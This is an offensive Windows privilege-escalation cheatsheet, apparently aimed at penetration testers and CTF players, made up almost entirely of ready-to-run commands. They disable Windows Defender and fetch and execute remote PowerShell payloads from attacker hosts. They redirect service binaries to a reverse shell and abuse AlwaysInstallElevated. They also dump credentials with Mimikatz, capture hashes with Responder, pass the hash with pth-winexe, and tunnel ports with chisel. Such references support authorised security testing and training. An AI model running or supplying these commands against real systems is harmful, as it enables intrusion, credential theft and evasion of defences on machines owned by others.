# Windows Privilege Escalation Cheatsheet

> Source: noobsec.net/privesc-windows

---

## Table of Contents

- [General Enumeration](#general-enumeration)
- [File Transfer](#file-transfer)
- [Automated Enumeration](#automated-enumeration)
- [Hacking Services](#hacking-services)
- [Registry](#registry)
- [Credentials & Hashes](#credentials--hashes)
- [RunAs](#runas)
- [Find Files Fast](#find-files-fast)
- [Port Forwarding](#port-forwarding)

---

## General Enumeration

> Unless specified, commands work in both `cmd.exe` and `powershell.exe`

### Who am I?
```cmd
whoami
echo %username%
whoami /all
```

### Check architecture (PowerShell)
```powershell
[environment]::Is64BitOperatingSystem
[environment]::Is64BitProcess
```
> Both should match. If either is 32-bit, try to get a 64-bit shell.

### PowerShell language mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```
> `FullLanguage` is preferred. `ConstrainedLanguage` limits what you can run.

### System info
```cmd
systeminfo
hostname
echo %hostname%
```

### Local users & groups
```cmd
net users
net groups
net users /domain
net groups /domain
```

### AppLocker policies (PowerShell)
```powershell
Get-AppLockerPolicy -Effective
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Open ports & services
```cmd
netstat -ano
```

### Disable Windows Defender (requires admin, PowerShell)
```powershell
Set-MpPreference -DisableRealTimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

---

## File Transfer

### SMB (Impacket)

**Kali — start SMB server**
```bash
sudo impacket-smbserver abcd /path/to/serve
```

**Mount on Windows**
```cmd
net use abcd: \\kali_ip\myshare
net use abcd: /d        # disconnect
net use abcd: /delete   # delete
```

```powershell
New-PSDrive -Name "abcd" -PSProvider "FileSystem" -Root "\\ip\abcd"
Remove-PSDrive -Name abcd
```

**Copy without mounting**
```cmd
copy //kali_ip/abcd/file C:\path\to\save
copy C:\path\to\file //kali_ip/abcd
```

### HTTP

**Load into memory (bypasses trivial AV)**
```powershell
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/file')"
powershell.exe iex (iwr http://ip/file -usebasicparsing)
```

**Save to disk**
```powershell
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')"
powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip/file' -Outfile '/path/to/file'"
```

**certutil (cmd or PowerShell)**
```cmd
certutil -urlcache -f http://kali_ip/file file
```

---

## Automated Enumeration

### WinPEAS
```cmd
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```
> Run above first for color output, then spawn a new shell.
```cmd
.\winpeasany.exe quiet
```

### Windows Exploit Suggester (Kali)
```bash
.\windows-exploit-suggester.py --update
.\windows-exploit-suggester.py -i systeminfo.txt -d 2022-xxx.xlsx
```
> Copy `systeminfo` output to a file on Kali first. Works best on older machines.

### PowerUp
```powershell
# From disk
powershell -ep bypass -c "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

# From memory (add Invoke-AllChecks at bottom of script first)
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/PowerUp.ps1')"
```

---

## Hacking Services

### Accesschk.exe flags reference
```
-c  Name a windows service, or * for all
-d  Only process directories
-k  Name a registry key e.g., hklm/software
-q  Omit banner
-s  Recurse
-u  Suppress errors
-v  Verbose
-w  Show objects with write access
```

### Check service permissions
```cmd
# ALWAYS check start/stop permission before exploiting
.\accesschk.exe /accepteula -ucqv <user> <svc_name>

# Writable services by group
.\accesschk.exe /accepteula -uwcqv Users *
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

### Check unquoted service paths
```cmd
.\accesschk.exe /accepteula -uwdv "C:\Program Files"
```

### Check executable permissions
```cmd
.\accesschk.exe /accepteula -uqv "C:\Program Files\app\file.exe"
```

### Find all weak permissions

**Folders**
```cmd
.\accesschk.exe /accepteula -uwdqs Users c:\
.\accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
```

**Files**
```cmd
.\accesschk.exe /accepteula -uwqs Users c:\*.*
.\accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
```

### Weak registry permissions
```cmd
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\svc_name
```

### Get ACLs (PowerShell)
```powershell
# Service registry ACL
Get-Acl HKLM\System\CurrentControlSet\Services\svc_name | Format-List

# File or folder ACL
(Get-Acl C:\path\to\file).access | ft IdentityReference,FileSystemRights,AccessControlType
```

### Exploit service with sc.exe
```cmd
# Query config
sc qc svc

# Query current state
sc query svc

# Replace binary path
sc config svc binpath= "\"C:\Downloads\shell.exe\""

# Handle dependencies
sc config depend_svc start= auto
net start depend_svc
net start svc

# Or remove dependency
sc config svc depend= ""

# Start / stop
net start svc
net stop svc
```

---

## Registry

```cmd
# Query service registry config
reg query HKLM\System\CurrentControlSet\Services\svc_name

# Point ImagePath to malicious binary
reg add HKLM\SYSTEM\CurrentControlSet\services\svc_name /v ImagePath /t REG_EXPAND_SZ /d C:\path\shell.exe /f

# Start the service to trigger shell
net start svc
```

### AlwaysInstallElevated
```cmd
# Both must return 0x1 to exploit
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
> If both are `0x1`, run a malicious `.msi` as SYSTEM.

---

## Credentials & Hashes

### Find credentials

**Common registry locations**
```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogin"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

**Interesting files**
```cmd
dir /s SAM
dir /s SYSTEM
dir /s Unattend.xml
```

### Extract credentials (no admin — Responder)

**Start listener**
```bash
sudo nc -nvlp 445
```

**Get target to connect**
```cmd
copy \\kali_ip\test\file
```

**Capture hash with Responder**
```bash
sudo responder -I tun0 -wrf
```
> Crack the captured hash with `john` or `hashcat`.

### Extract credentials (with admin — Mimikatz)
```
privilege::debug
sekurlsa::logonpasswords
token::elevate
lsadump::lsa /patch
vault::list
vault::cred /patch
```

### Leverage credentials

**Plaintext password**
```bash
winexe -U 'user%pass123' //10.10.10.10 cmd.exe
winexe -U 'user%pass123' --system //10.10.10.10 cmd.exe   # admin only
```

**Hash (pass-the-hash)**
```bash
pth-winexe -U 'domain\user%hash' //10.10.10.10 cmd.exe
pth-winexe -U 'domain\user%hash' --system //10.10.10.10 cmd.exe
```

---

## RunAs

**CMD (saved creds)**
```cmd
runas /savecred /user:admin C:\abcd\reverse.exe
```

**PowerShell method 1**
```powershell
$password = ConvertTo-SecureString 'pass123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://kali_ip/shell.ps1')" -Credential $cred
```

**PowerShell method 2**
```powershell
$username = "domain\Administrator"
$password = "pass123"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost
```

---

## Find Files Fast

**CMD or PowerShell**
```cmd
dir /s <filename>
```

**PowerShell**
```powershell
Get-ChildItem -Path C:\ -Include *filename_wildcard* -Recurse -ErrorAction SilentlyContinue
```

---

## Port Forwarding

> Use when target ports are listening but inaccessible externally.

**Kali**
```bash
./chisel server --reverse --port 9001
```

**Windows**
```cmd
.\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT
# Example:
.\chisel.exe client KALI_IP:9001 R:445:127.0.0.1:445
```

**Then connect from Kali via forwarded port**
```bash
winexe -U 'administrator%pass123' --system //127.0.0.1 cmd.exe
smbexec.py domain/username:password@127.0.0.1
mysql --host=127.0.0.1 --port=KALI_PORT -u username -p
```

---

## Key Notes

- To exploit a service you need: write permission + start permission + stop permission
- Look for non-standard programs — they're more likely to be misconfigured
- If 32-bit shell on 64-bit OS, escalate to 64-bit before exploiting
- Always verify service config after making changes: `sc qc svc`
- `winexe --system` only works if you have admin credentials
